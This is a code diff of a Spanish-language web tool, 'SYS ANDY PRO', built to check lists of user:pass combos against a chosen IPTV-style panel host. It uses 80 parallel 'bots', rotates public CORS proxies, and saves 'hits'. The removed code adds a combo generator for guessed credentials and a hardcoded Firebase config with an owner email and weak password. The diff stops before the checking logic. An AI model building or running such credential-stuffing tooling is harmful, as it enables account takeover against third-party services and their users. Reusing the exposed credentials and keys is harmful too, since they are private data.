@@ -2,879 +2,648 @@
 <html lang="es">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
-    <title>SISTEMA ANDY PRO - Global Multi-Admin</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SYS ANDY PRO</title>
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Cinzel:wght=700;900&family=Orbitron:wght@700&display=swap');
-
-        :root { 
-            --bg-main: #0b141a; 
-            --panel-header: #202c33;
-            --input-bg: #2a3942;
-            --text-main: #e9edef; 
-            --text-muted: #8696a0;
-            --wa-teal: #FFDD00; 
-            --danger: #ef4444;
-            --success: #00a884;
-            --blue-sub: #0033A0;
-            --red-sub: #D52B1E;
-            --accent-start: #a855f7;
-            --accent-end: #22d3ee;
-            --accent-gradient: linear-gradient(180deg, var(--accent-start), var(--accent-end));
-        }
-        
-        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, sans-serif; }
-        
-        html, body { 
-            height: 100%; 
-            width: 100%; 
-            background: linear-gradient(135deg, #FFDD00 0%, #0033A0 50%, #D52B1E 100%);
-            color: var(--text-main);
-            overflow: hidden;
-            position: fixed;
+        :root {
+            --bg-principal: #0b0e14;
+            --bg-tarjeta: #131722;
+            --bg-inputs: #1f2535;
+            --texto-principal: #f5f6f9;
+            --texto-secundario: #9aa4bf;
+            --verde-hit: #00e676;
+            --rojo-stop: #d32f2f;
+            --azul-boton: #1e88e5;
+            --borde-neon: #a855f7;
         }
 
-        body::before {
-            content: '';
-            position: fixed;
-            top: 0;
-            left: 0;
+        body {
+            background-color: var(--bg-principal);
+            color: var(--texto-principal);
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            margin: 0;
+            padding: 0;
+        }
+
+        /* Barra de navegación superior */
+        .navbar {
+            background-color: var(--bg-tarjeta);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 10px 15px;
+            border-bottom: 2px solid #ff4444;
+        }
+
+        .logo-area {
+            display: flex;
+            flex-direction: column;
+        }
+
+        .logo-title {
+            font-size: 1.3rem;
+            font-weight: bold;
+            color: #ffeb3b;
+        }
+
+        .logo-sub {
+            font-size: 0.85rem;
+            color: #00e676;
+        }
+
+        .btn-salir {
+            background-color: var(--rojo-stop);
+            color: white;
+            border: none;
+            padding: 6px 12px;
+            border-radius: 4px;
+            cursor: pointer;
+            font-weight: bold;
+        }
+
+        /* Pestañas de secciones */
+        .tabs-container {
+            display: flex;
+            background-color: #1a1f2c;
+            border-bottom: 1px solid #2d3748;
+        }
+
+        .tab-btn {
+            flex: 1;
+            padding: 12px;
+            background: none;
+            border: none;
+            color: var(--texto-secundario);
+            font-weight: bold;
+            cursor: pointer;
+            text-align: center;
+        }
+
+        .tab-btn.active {
+            color: #ffeb3b;
+            border-bottom: 3px solid #ffeb3b;
+            background-color: var(--bg-tarjeta);
+        }
+
+        /* Contenedor de paneles */
+        .panel {
+            padding: 15px;
+            display: none;
+        }
+
+        .panel.active {
+            display: block;
+        }
+
+        /* Formularios y controles del escáner */
+        .form-group {
+            margin-bottom: 15px;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 5px;
+            color: var(--texto-secundario);
+            font-size: 0.95rem;
+        }
+
+        input[type="text"], input[type="number"], textarea {
             width: 100%;
-            height: 5px;
-            background: linear-gradient(to right, #FFDD00 0%, #FFDD00 50%, #0033A0 50%, #0033A0 75%, #D52B1E 75%, #D52B1E 100%);
-            z-index: 9999;
-        }
-        
-        .hidden { display: none !important; }
-
-        /* PANTALLA DE ACCESO */
-        .auth-container { height: 100%; display: flex; justify-content: center; align-items: center; padding: 15px; overflow-y: auto; }
-        .auth-card { background: rgba(10,10,10,0.95); padding: 30px; border-radius: 15px; width: 100%; max-width: 380px; text-align: center; border: 3px solid var(--wa-teal); box-shadow: 0 0 20px rgba(255, 221, 0, 0.3); }
-        .auth-card h2 { font-family: 'Cinzel', serif; color: var(--wa-teal); margin-bottom: 5px; font-size: 1.8rem; text-shadow: 2px 2px 0px var(--blue-sub); }
-        .auth-card p { color: var(--text-muted); font-size: 0.85rem; margin-bottom: 15px; font-weight: bold; }
-
-        input, select, textarea { width: 100%; padding: 12px; margin: 6px 0; border-radius: 8px; border: 2px solid #333; background: var(--input-bg); color: white; font-size: 15px; outline: none; font-weight: bold; }
-        input:focus, select:focus, textarea:focus { border-color: var(--blue-sub); }
-        input::placeholder { color: var(--text-muted); }
-        
-        button { padding: 12px; border-radius: 8px; border: none; font-weight: bold; font-size: 14px; cursor: pointer; text-transform: uppercase; letter-spacing: 1px; transition: all 0.2s; }
-        button:active { transform: scale(0.98); opacity: 0.8; }
-        .btn-wa { width: 100%; background: var(--blue-sub); color: white; margin-top: 5px; }
-        .btn-wa:hover { background: #002270; }
-        .btn-danger { background: var(--red-sub); color: white; }
-        .btn-danger:hover { background: #b82016; }
-        .btn-success { background: var(--success); color: white; }
-
-        /* INTERFAZ PRINCIPAL */
-        .app-container { display: flex; flex-direction: column; height: 100%; width: 100%; }
-        
-        .app-header { 
-            height: 60px; background: rgba(10,10,10,0.94); padding: 0 14px; 
-            display: flex; align-items: center; justify-content: space-between; flex-shrink: 0; z-index: 10;
-            border-bottom: 2px solid var(--wa-teal);
-        }
-        .user-info { display: flex; align-items: center; gap: 10px; }
-        .user-text .title { font-family: 'Cinzel', serif; font-weight: 900; font-size: 1.2rem; color: var(--wa-teal); text-shadow: 1px 1px 0px var(--red-sub); }
-        .user-text .status { font-size: 0.72rem; color: #00ff9d; display: block; font-family: monospace; }
-        .header-actions { display: flex; gap: 6px; align-items: center; }
-        .btn-action { background: #2a3942; color: white; padding: 8px 12px; font-size: 0.8rem; border-radius: 6px; border: 1px solid var(--wa-teal); }
-
-        /* NAVEGACIÓN */
-        .nav-tabs { display: flex; background: rgba(20,20,20,0.95); border-bottom: 1px solid #333; flex-shrink: 0; overflow-x: auto; -webkit-overflow-scrolling: touch; }
-        .tab-item { flex: 1; min-width: 90px; padding: 12px 3px; text-align: center; font-size: 0.75rem; font-weight: bold; color: var(--text-muted); cursor: pointer; text-transform: uppercase; border-bottom: 3px solid transparent; white-space: nowrap; }
-        .tab-item.active { color: var(--wa-teal); border-bottom-color: var(--wa-teal); background: rgba(255,221,0,0.05); }
-
-        /* CONTENEDOR PRINCIPAL */
-        .main-content { flex: 1; overflow-y: auto; background: rgba(10,10,10,0.92); padding: 12px; display: flex; flex-direction: column; padding-bottom: calc(15px + env(safe-area-inset-bottom)); }
-        
-        /* BLOC DE NOTAS */
-        .note-form { background: var(--panel-header); padding: 12px; border-radius: 10px; border-left: 4px solid var(--wa-teal); margin-bottom: 15px; }
-        .notes-grid { display: flex; flex-direction: column; gap: 10px; }
-        .note-card { background: #1a1a1a; border: 1px solid #333; padding: 12px; border-radius: 8px; display: flex; flex-direction: column; gap: 6px; position: relative; }
-        .note-card p { font-family: monospace; color: #00ff9d; font-size: 0.9rem; word-break: break-all; white-space: pre-wrap; }
-        .note-meta { font-size: 0.7rem; color: var(--text-muted); text-align: right; }
-        .note-actions { display: flex; gap: 6px; justify-content: flex-end; margin-top: 4px; }
-        .btn-mini { padding: 5px 10px; font-size: 0.75rem; border-radius: 4px; border: none; font-weight: bold; color: white; text-transform: uppercase; cursor: pointer; }
-
-        /* GENERADOR DE COMBOS */
-        .gen-section h3, .scan-section h3 { font-family: 'Cinzel', serif; color: var(--wa-teal); text-align: center; margin-bottom: 10px; font-size: 1.3rem; }
-        .gen-container { width: 100%; max-width: 500px; margin: 0 auto; }
-        .gen-label { font-size: 0.85rem; color: var(--text-muted); font-weight: bold; display: block; margin-top: 6px; text-align: left; }
-        textarea.resultado-box { height: 180px; color: #00ff9d; background: #050505; border: 2px solid var(--blue-sub); font-family: monospace; margin-top: 10px; }
-
-        /* NUEVO DISEÑO ESCÁNER INTEGRADO */
-        .scanner-title { text-align: center; font-size: 1.1rem; font-family: 'Orbitron', monospace; background: linear-gradient(90deg, #a855f7, #fff, #22d3ee); -webkit-background-clip: text; background-clip: text; color: transparent; border: 2px solid #a855f7; border-radius: 8px; padding: 8px; margin-bottom: 15px; animation: neonFlicker 1.5s infinite; }
-        
-        @keyframes neonFlicker {
-            0%, 100% { text-shadow: 0 0 8px rgba(168,85,247,.7), 0 0 14px rgba(34,211,238,.7); border-color: #a855f7; }
-            50% { text-shadow: none; border-color: #222; }
+            padding: 10px;
+            background-color: var(--bg-inputs);
+            border: 1px solid #3a4454;
+            border-radius: 6px;
+            color: white;
+            box-sizing: border-box;
+            font-size: 1rem;
         }
 
-        .progress-job-container { margin-top: 12px; border: 2px solid transparent; border-radius: 10px; padding: 10px; background: #000; box-shadow: 0 0 12px rgba(168,85,247,.4); }
-        .progress-bar-bg { background: #111; border-radius: 10px; height: 16px; overflow: hidden; margin-top: 5px; }
-        .progress-bar-fill { background: var(--accent-gradient); height: 100%; width: 0%; transition: width .3s ease; }
-        .job-top { display: flex; justify-content: space-between; font-size: 0.8rem; font-weight: bold; color: #e6f3ff; font-family: 'Orbitron', monospace; }
-        .current-combo-text { font-size: 0.75rem; color: #22d3ee; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; margin-top: 4px; font-family: monospace; }
-        
-        #hitsContainer, .db-hits-container { background: #050505; border: 1px solid #222; border-radius: 10px; padding: 10px; margin-top: 12px; height: 300px; overflow-y: auto; }
-        .hit-block { font-family: monospace; white-space: pre-wrap; background: #000; padding: 12px; margin-bottom: 12px; border-radius: 6px; border: 2px solid rgba(34,211,238,.4); line-height: 1.4; color: #e6f3ff; position: relative; font-size: 0.85rem; box-shadow: 0 0 10px rgba(168,85,247,0.3); }
-        .hit-block-db { border-left: 4px solid var(--wa-teal); background: #111; margin-bottom: 10px; padding: 10px; border-radius: 6px; font-family: monospace; font-size: 0.85rem; position: relative; }
-        .copy-btn { position: absolute; top: 8px; right: 8px; background: #222; color: #fff; border: 1px solid #444; padding: 4px 8px; font-size: 9px; cursor: pointer; border-radius: 4px; font-weight: bold; }
-        .counter-badge { display: inline-block; background: var(--blue-sub); color: #fff; padding: 2px 6px; border-radius: 4px; font-size: 0.75rem; font-weight: bold; margin-top: 5px; }
-        .yellow-hit { color: yellow; text-shadow: 0 0 6px yellow; font-weight: bold; }
+        .checkbox-row {
+            display: flex;
+            gap: 15px;
+            margin: 15px 0;
+            flex-wrap: wrap;
+        }
 
-        /* SECCIÓN MULTI-ADMINISTRADORES */
-        .admin-box { background: var(--panel-header); padding: 15px; border-radius: 10px; margin-bottom: 15px; border: 1px solid var(--wa-teal); }
-        .admin-box h4 { font-family: 'Cinzel', serif; color: var(--wa-teal); margin-bottom: 8px; }
-        .member-item { display: flex; flex-direction: column; background: #2a3942; padding: 10px; border-radius: 6px; margin-bottom: 8px; font-size: 0.85rem; border-left: 3px solid var(--success); }
-        .member-meta { font-size: 0.75rem; color: var(--text-muted); margin-top: 2px; }
+        .checkbox-label {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            cursor: pointer;
+        }
+
+        /* Botones de acción principales */
+        .btn-block {
+            width: 100%;
+            padding: 12px;
+            font-size: 1.1rem;
+            font-weight: bold;
+            border: none;
+            border-radius: 6px;
+            margin-bottom: 10px;
+            cursor: pointer;
+            color: white;
+        }
+
+        .btn-start { background-color: #00bfa5; }
+        .btn-stop { background-color: var(--rojo-stop); }
+        .btn-save { background-color: #0d47a1; }
+        .btn-block:disabled { background-color: #424242; color: #757575; cursor: not-allowed; }
+
+        /* Estilos de las cajas de los Trabajos (Jobs) */
+        .job-card {
+            background-color: #05070a;
+            border: 1px solid #222;
+            border-radius: 8px;
+            padding: 12px;
+            margin-bottom: 15px;
+            box-shadow: 0 0 10px rgba(0,0,0,0.5);
+        }
+
+        .job-header {
+            display: flex;
+            justify-content: space-between;
+            font-weight: bold;
+            margin-bottom: 6px;
+        }
+
+        .yellow-hit {
+            color: #ffff00;
+            text-shadow: 0 0 5px rgba(255,255,0,0.5);
+        }
+
+        .progress-bar-bg {
+            background-color: #111;
+            border-radius: 10px;
+            height: 18px;
+            overflow: hidden;
+            margin-bottom: 6px;
+        }
+
+        .progress-bar-fill {
+            background: linear-gradient(90deg, #a855f7, #22d3ee);
+            height: 100%;
+            width: 0%;
+            transition: width 0.3s ease;
+        }
+
+        .job-status {
+            font-size: 0.85rem;
+            color: var(--texto-secundario);
+            margin-bottom: 4px;
+        }
+
+        .job-user {
+            font-size: 0.85rem;
+            color: #00fffa;
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+        }
+
+        /* Contenedor Global de Resultados (Hits abajo) */
+        .results-title {
+            color: #ffeb3b;
+            font-size: 1.2rem;
+            margin-top: 20px;
+            margin-bottom: 10px;
+            font-weight: bold;
+        }
+
+        #hitsContainer {
+            background-color: var(--bg-tarjeta);
+            padding: 10px;
+            border-radius: 8px;
+            max-height: 400px;
+            overflow-y: auto;
+        }
+
+        .hit-block {
+            background-color: #000;
+            border: 1px solid #3a1f5c;
+            border-radius: 8px;
+            padding: 12px;
+            margin-bottom: 10px;
+            box-shadow: 0 0 8px rgba(168,85,247,0.3);
+        }
+
+        .hit-header {
+            font-weight: bold;
+            color: #00fff7;
+            margin-bottom: 5px;
+            border-bottom: 1px solid #222;
+            padding-bottom: 3px;
+        }
+
+        .hit-content {
+            white-space: pre-wrap;
+            color: #cfe9ff;
+            font-size: 0.9rem;
+            margin: 0;
+            font-family: monospace;
+        }
     </style>
 </head>
 <body>
 
-    <div id="authScreen" class="auth-container">
-        <div class="auth-card">
-            <h2>⚙️ GEN ANDY ⚙️</h2>
-            <p>Premium System &amp; Credentials</p>
-            <input type="email" id="loginEmail" placeholder="Correo de Acceso">
-            <input type="password" id="loginPass" placeholder="Contraseña">
-            <button class="btn-wa" id="btnIngresar">VERIFICAR ACCESO</button>
+    <div class="navbar">
+        <div class="logo-area">
+            <span class="logo-title">⚙️ SYS ANDY PRO</span>
+            <span class="logo-sub">Admin Activo: Andy Obregón (Owner)</span>
         </div>
+        <button class="btn-salir" onclick="alert('Saliendo...')">SALIR</button>
     </div>
 
-    <div id="appScreen" class="app-container hidden">
-        <div class="app-header">
-            <div class="user-info">
-                <div class="user-text">
-                    <span class="title">⚙️ SYS ANDY PRO</span>
-                    <span id="userStatus" class="status">Cargando Administrador...</span>
-                </div>
-            </div>
-            <div class="header-actions">
-                <button id="btnSalir" class="btn-action" style="background:var(--input-bg); color:var(--danger); border-color:var(--danger)">Salir</button>
-            </div>
-        </div>
-
-        <div class="nav-tabs">
-            <div class="tab-item active" id="tabBloc" onclick="switchTab('bloc')">📝 Bloc</div>
-            <div class="tab-item" id="tabGen" onclick="switchTab('gen')">⚙️ Combos</div>
-            <div class="tab-item" id="tabScan" onclick="switchTab('scan')">📡 Escáner LSF</div>
-            <div class="tab-item" id="tabAdmins" onclick="switchTab('admins')">👥 Admins</div>
-        </div>
-
-        <div class="main-content">
-            
-            <div id="secBloc" class="view-section">
-                <div class="note-form">
-                    <input type="text" id="noteTitle" placeholder="Título o etiqueta">
-                    <textarea id="noteContent" placeholder="Escribe o pega tus datos aquí..." style="height:80px; font-family:sans-serif;"></textarea>
-                    <input type="hidden" id="editNoteId" value="">
-                    <button class="btn-wa" id="btnGuardarNota" style="background:var(--success); margin-top:5px;">Guardar Registro</button>
-                    <button class="btn-wa hidden" id="btnCancelarEdit" style="background:var(--input-bg); margin-top:5px;">Cancelar</button>
-                </div>
-                <div class="notes-grid" id="notesList"></div>
-            </div>
-
-            <div id="secGen" class="view-section hidden">
-                <div class="gen-section">
-                    <h3>⚙️ Generador de Combos</h3>
-                    <div class="gen-container">
-                        <span class="gen-label">Cantidad de Combos</span>
-                        <input type="number" id="cantidad" value="100">
-                        <span class="gen-label">Longitud Contraseña</span>
-                        <input type="number" id="longitud" value="8">
-                        <span class="gen-label">Tipo de Usuario</span>
-                        <select id="tipo">
-                            <option value="random">Usuario Random</option>
-                            <option value="email">Email Gmail</option>
-                            <option value="nombre">Nombre Simple</option>
-                            <option value="nombrenombre">Nombre:Nombre</option>
-                            <option value="nombreigual">Nombre = Pass</option>
-                            <option value="andymix">Nombre combinado Infinito</option>
-                        </select>
-                        <span class="gen-label">Agregar Año</span>
-                        <select id="anio">
-                            <option value="">Sin año</option>
-                            <option value="2024">2024</option>
-                            <option value="2025">2025</option>
-                            <option value="2026">2026</option>
-                            <option value="2027">2027</option>
-                        </select>
-                        <span class="gen-label">Separador</span>
-                        <select id="sep">
-                            <option value=":">:</option>
-                            <option value="|">|</option>
-                            <option value=";">;</option>
-                        </select>
-                        <button id="btnGenerarCombos" style="background:var(--blue-sub); margin-top:10px; width:100%;">Generar Combos</button>
-                        <button id="btnDescargarCombos" class="btn-danger" style="margin-top:5px; width:100%;">Descargar TXT</button>
-                        <textarea id="resultado" class="resultado-box" readonly placeholder="Los combos aparecerán aquí..."></textarea>
-                    </div>
-                </div>
-            </div>
-
-            <div id="secScan" class="view-section hidden">
-                <div class="scan-section">
-                    <div class="scanner-title">📡 TRIPLE ESCÁNER LOS LOCOS SIN FRONTERAS 📡</div>
-                    
-                    <span class="gen-label">Panel (host con o sin http/https):</span>
-                    <input type="text" id="hostInput" placeholder="ej: lista.com:8080" autocomplete="off" />
-
-                    <span class="gen-label">Elige archivos .txt independientes (user:pass):</span>
-                    <input type="file" id="comboFile1" accept=".txt" style="font-size:11px; padding:6px; margin-bottom:4px;" />
-                    <input type="file" id="comboFile2" accept=".txt" style="font-size:11px; padding:6px; margin-bottom:4px;" />
-                    <input type="file" id="comboFile3" accept=".txt" style="font-size:11px; padding:6px;" />
-
-                    <span class="gen-label">…o pega combos (texto libre):</span>
-                    <textarea id="comboText" rows="4" placeholder="Pega cualquier texto aquí; el formato user:pass será detectado de forma automática por línea." style="background:#000; font-family:monospace;"></textarea>
-
-                    <span class="gen-label">Número de conexiones paralelas (bots):</span>
-                    <input type="number" id="concurrencyInput" value="80" min="1" max="100" />
-
-                    <div style="margin: 10px 0; font-size:0.85rem; display: flex; gap: 15px;">
-                        <label><input type="checkbox" id="useCors" checked /> Proxy CORS</label>
-                        <label><input type="checkbox" id="soundToggle" checked /> 🔔 Sonido en Hit</label>
-                        <label><input type="checkbox" id="autoDownload" checked /> ⬇️ Auto-Descarga</label>
-                    </div>
-
-                    <button id="startBtn" style="background:var(--success); width:100%;" disabled>INICIAR SCAN MULTI-JOB</button>
-                    <button id="stopBtn" class="btn-danger" style="margin-top:5px; width:100%;" disabled>DETENER SCAN</button>
-                    <button id="saveBtn" style="background:var(--blue-sub); margin-top:5px; width:100%;" disabled>GUARDAR TODO EN TELÉFONO (.TXT)</button>
-
-                    <div id="progressContainer" class="progress-job-container">
-                        <div class="job-top">
-                            <div>Trabajo de Análisis 1</div>
-                            <div id="hitsCount1">Hits: <span class="yellow-hit">0</span></div>
-                        </div>
-                        <div class="progress-bar-bg"><div id="progressBarFill" class="progress-bar-fill"></div></div>
-                        <div id="progressText" style="font-size:0.75rem; margin-top:4px;">Esperando inicio...</div>
-                        <div id="currentCombo" class="current-combo-text">Usuario actual: -</div>
-                    </div>
-
-                    <div id="progressContainer2" class="progress-job-container">
-                        <div class="job-top">
-                            <div>Trabajo de Análisis 2</div>
-                            <div id="hitsCount2">Hits: <span class="yellow-hit">0</span></div>
-                        </div>
-                        <div class="progress-bar-bg"><div id="progressBarFill2" class="progress-bar-fill"></div></div>
-                        <div id="progressText2" style="font-size:0.75rem; margin-top:4px;">Esperando inicio...</div>
-                        <div id="currentCombo2" class="current-combo-text">Usuario actual: -</div>
-                    </div>
-
-                    <div id="progressContainer3" class="progress-job-container">
-                        <div class="job-top">
-                            <div>Trabajo de Análisis 3</div>
-                            <div id="hitsCount3">Hits: <span class="yellow-hit">0</span></div>
-                        </div>
-                        <div class="progress-bar-bg"><div id="progressBarFill3" class="progress-bar-fill"></div></div>
-                        <div id="progressText3" style="font-size:0.75rem; margin-top:4px;">Esperando inicio...</div>
-                        <div id="currentCombo3" class="current-combo-text">Usuario actual: -</div>
-                    </div>
-
-                    <h4 style="margin-top:15px; color:var(--wa-teal); font-family:'Cinzel';">Resultados del Escaneo Actual:</h4>
-                    <div id="hitsContainer"></div>
-
-                    <h4 style="margin-top:20px; color:var(--wa-teal); font-family:'Cinzel';">🌐 Mis Hits Guardados (Mis Escaneos en Servidor):</h4>
-                    <div class="db-hits-container" id="dbHitsList"></div>
-                </div>
-            </div>
-
-            <div id="secAdmins" class="view-section hidden">
-                <div class="admin-box">
-                    <h4>Registrar Nuevo Administrador</h4>
-                    <input type="text" id="newAdminName" placeholder="Nombre de Identificación">
-                    <input type="email" id="newAdminEmail" placeholder="Correo de Acceso">
-                    <input type="text" id="newAdminPass" placeholder="Clave de Acceso">
-                    <button class="btn-wa" id="btnCrearAdmin" style="background:var(--blue-sub)">Otorgar Acceso Total</button>
-                </div>
-                <div class="admin-box" style="background:transparent; padding:0; border:none;">
-                    <h4>Administradores en Red</h4>
-                    <div id="adminsList" style="margin-top:10px;"></div>
-                </div>
-            </div>
-
-        </div>
+    <div class="tabs-container">
+        <button class="tab-btn" onclick="switchTab('bloc')">📝 BLOC</button>
+        <button class="tab-btn" onclick="switchTab('combos')">📦 COMBOS</button>
+        <button class="tab-btn active" onclick="switchTab('scanner')">📡 ESCÁNER LSF</button>
+        <button class="tab-btn" onclick="switchTab('admins')">👥 ADMINS</button>
     </div>
 
-    <script type="module">
-        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
-        import { getFirestore, collection, addDoc, doc, query, orderBy, onSnapshot, serverTimestamp, updateDoc, deleteDoc, where, getDocs, increment } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
+    <div id="panel-bloc" class="panel">
+        <h3>Bloc de Notas</h3>
+        <textarea rows="10" placeholder="Escribe tus notas aquí..."></textarea>
+    </div>
 
-        const firebaseConfig = {
-            apiKey: "AIzaSyDGE5GTlwIypuryIVnDYiTR9a2wyCgWkfs",
-            authDomain: "gestion-ventas-pro-f8de4.firebaseapp.com",
-            projectId: "gestion-ventas-pro-f8de4",
-            storageBucket: "gestion-ventas-pro-f8de4.firebasestorage.app",
-            messagingSenderId: "96449660649",
-            appId: "1:96449660649:web:d949eccf893c9705451278"
-        };
+    <div id="panel-combos" class="panel">
+        <h3>Gestión de Combos</h3>
+        <p style="color:var(--texto-secundario)">Carga tus listas de canales o configuraciones acá.</p>
+    </div>
 
-        const app = initializeApp(firebaseConfig);
-        const db = getFirestore(app);
+    <div id="panel-scanner" class="panel active">
+        <div class="form-group">
+            <label>Panel (Host con o sin http/https):</label>
+            <input type="text" id="hostInput" placeholder="ej: lista.com:8080" />
+        </div>
 
-        const ADMIN_REAL = {
-            email: "andyobregon799@gmail.com",
-            pass: "123456",
-            nombre: "Andy Obregón (Owner)",
-            role: "owner"
-        };
+        <div class="form-group">
+            <label>Selecciona tus 3 archivos de Combos (.txt):</label>
+            <input type="file" id="comboFile1" accept=".txt" style="margin-bottom:6px;" />
+            <input type="file" id="comboFile2" accept=".txt" style="margin-bottom:6px;" />
+            <input type="file" id="comboFile3" accept=".txt" />
+        </div>
 
-        let sesionUsuario = JSON.parse(localStorage.getItem('andy_sys_session')) || null;
+        <div class="form-group">
+            <label>...o pega tus combos aquí en texto libre (user:pass):</label>
+            <textarea id="comboText" rows="4" placeholder="Usuario1:Contraseña1&#10;Usuario2:Contraseña2"></textarea>
+        </div>
 
-        if (sesionUsuario) { entrarAlApp(); }
+        <div class="form-group">
+            <label>Número de conexiones paralelas (bots):</label>
+            <input type="number" id="concurrencyInput" value="80" min="1" max="100" />
+        </div>
 
-        window.switchTab = function(tab) {
-            document.querySelectorAll('.view-section').forEach(el => el.classList.add('hidden'));
-            document.querySelectorAll('.tab-item').forEach(el => el.classList.remove('active'));
+        <div class="checkbox-row">
+            <label class="checkbox-label"><input type="checkbox" id="useCors" checked /> Proxy CORS</label>
+            <label class="checkbox-label"><input type="checkbox" id="soundToggle" checked /> 🔔 Sonido en Hit</label>
+            <label class="checkbox-label"><input type="checkbox" id="autoDownload" checked /> ⬇️ Auto-Descarga</label>
+        </div>
+
+        <button id="startBtn" class="btn-block btn-start" disabled>INICIAR SCAN MULTI-JOB</button>
+        <button id="stopBtn" class="btn-block btn-stop" disabled>DETENER SCAN</button>
+        <button id="saveBtn" class="btn-block btn-save" disabled>GUARDAR TODO EN TELÉFONO (.TXT)</button>
+
+        <div class="job-card">
+            <div class="job-header">
+                <span>Trabajo de Análisis 1</span>
+                <span id="hitsCount1">Hits: <span class="yellow-hit">0</span></span>
+            </div>
+            <div class="progress-bar-bg"><div id="progressBarFill" class="progress-bar-fill"></div></div>
+            <div id="progressText" class="job-status">Procesados: 0 / 0</div>
+            <div id="currentCombo" class="job-user">Usuario actual: -</div>
+        </div>
+
+        <div class="job-card">
+            <div class="job-header">
+                <span>Trabajo de Análisis 2</span>
+                <span id="hitsCount2">Hits: <span class="yellow-hit">0</span></span>
+            </div>
+            <div class="progress-bar-bg"><div id="progressBarFill2" class="progress-bar-fill"></div></div>
+            <div id="progressText2" class="job-status">Procesados: 0 / 0</div>
+            <div id="currentCombo2" class="job-user">Usuario actual: -</div>
+        </div>
+
+        <div class="job-card">
+            <div class="job-header">
+                <span>Trabajo de Análisis 3</span>
+                <span id="hitsCount3">Hits: <span class="yellow-hit">0</span></span>
+            </div>
+            <div class="progress-bar-bg"><div id="progressBarFill3" class="progress-bar-fill"></div></div>
+            <div id="progressText3" class="job-status">Procesados: 0 / 0</div>
+            <div id="currentCombo3" class="job-user">Usuario actual: -</div>
+        </div>
+
+        <div class="results-title">Resultados del Escaneo Actual:</div>
+        <div id="hitsContainer"></div>
+    </div>
+
+    <div id="panel-admins" class="panel">
+        <h3>Panel Administrativo</h3>
+        <p style="color:var(--texto-secundario)">Configuración de vendedores autorizados y accesos.</p>
+    </div>
+
+    <script>
+        // Cambiar pestañas
+        function switchTab(tabName) {
+            document.querySelectorAll('.panel').forEach(p => p.classList.remove('active'));
+            document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
             
-            if(tab === 'bloc') {
-                document.getElementById('secBloc').classList.remove('hidden');
-                document.getElementById('tabBloc').classList.add('active');
-            } else if(tab === 'gen') {
-                document.getElementById('secGen').classList.remove('hidden');
-                document.getElementById('tabGen').classList.add('active');
-            } else if(tab === 'scan') {
-                document.getElementById('secScan').classList.remove('hidden');
-                document.getElementById('tabScan').classList.add('active');
-            } else if(tab === 'admins') {
-                document.getElementById('secAdmins').classList.remove('hidden');
-                document.getElementById('tabAdmins').classList.add('active');
-            }
-        };
-
-        document.getElementById('btnIngresar').onclick = async () => {
-            const email = document.getElementById('loginEmail').value.trim();
-            const pass = document.getElementById('loginPass').value.trim();
-            if (!email || !pass) return alert("Por favor rellene las credenciales.");
-
-            if (email === ADMIN_REAL.email && pass === ADMIN_REAL.pass) {
-                sesionUsuario = { id: "owner_global", ...ADMIN_REAL };
-                localStorage.setItem('andy_sys_session', JSON.stringify(sesionUsuario));
-                entrarAlApp();
-                return;
-            }
-
-            try {
-                const q = query(collection(db, "usuarios_vip"), where("email", "==", email), where("pass", "==", pass));
-                const snapshot = await getDocs(q);
-                if (snapshot.empty) { alert("Acceso inválido."); } else {
-                    const uDoc = snapshot.docs[0].data();
-                    sesionUsuario = { id: snapshot.docs[0].id, ...uDoc };
-                    localStorage.setItem('andy_sys_session', JSON.stringify(sesionUsuario));
-                    entrarAlApp();
-                }
-            } catch (err) { alert("Error de conexión."); }
-        };
-
-        function entrarAlApp() {
-            document.getElementById('authScreen').classList.add('hidden');
-            document.getElementById('appScreen').classList.remove('hidden');
-            document.getElementById('userStatus').innerText = `Admin Activo: ${sesionUsuario.nombre || sesionUsuario.identificacion}`;
-            escucharNotas();
-            escucharAdmins();
-            escucharHitsDB();
+            document.getElementById('panel-' + tabName).classList.add('active');
+            event.currentTarget.classList.add('active');
         }
 
-        // ================= FILTRADO INDEPENDIENTE POR ADMIN (BLOC DE NOTAS) =================
-        document.getElementById('btnGuardarNota').onclick = async () => {
-            const title = document.getElementById('noteTitle').value.trim();
-            const content = document.getElementById('noteContent').value.trim();
-            const editId = document.getElementById('editNoteId').value;
-            if (!content) return alert("Contenido vacío.");
+        // --- INICIO DE LA LÓGICA DE ESCANEO EFECTIVA (MUNRRA TV ENGINE) ---
+        const CORS_PROXIES = [
+            'https://cors.isomorphic-git.org/{url}',
+            'https://thingproxy.freeboard.io/fetch/{url}',
+            'https://api.allorigins.win/raw?url={url}',
+            'https://corsproxy.io/?{url}',
+            'https://api.codetabs.com/v1/proxy/?quest={url}',
+            'https://yacdn.org/proxy/{url}'
+        ];
 
-            const itemPayload = {
-                titulo: title || "Nota Sin Título",
-                contenido: content,
-                autor: sesionUsuario.nombre || sesionUsuario.identificacion || "Administrador",
-                usuarioId: sesionUsuario.id, // ID Único de Vinculación de Credenciales
-                timestamp: serverTimestamp()
-            };
+        const $ = id => document.getElementById(id);
+        const hostInput = $('hostInput');
+        const concurrencyInput = $('concurrencyInput');
+        const startBtn = $('startBtn'), stopBtn = $('stopBtn'), saveBtn = $('saveBtn');
+        const useCors = $('useCors'), soundToggle = $('soundToggle'), autoDownload = $('autoDownload');
+        const comboText = $('comboText');
+        const comboFile1 = $('comboFile1'), comboFile2 = $('comboFile2'), comboFile3 = $('comboFile3');
+        const hitsContainer = $('hitsContainer');
 
-            try {
-                if (editId) {
-                    await updateDoc(doc(db, "bloc_notas_vip", editId), itemPayload);
-                    document.getElementById('editNoteId').value = "";
-                    document.getElementById('btnCancelarEdit').classList.add('hidden');
-                    document.getElementById('btnGuardarNota').innerText = "Guardar Registro";
-                } else {
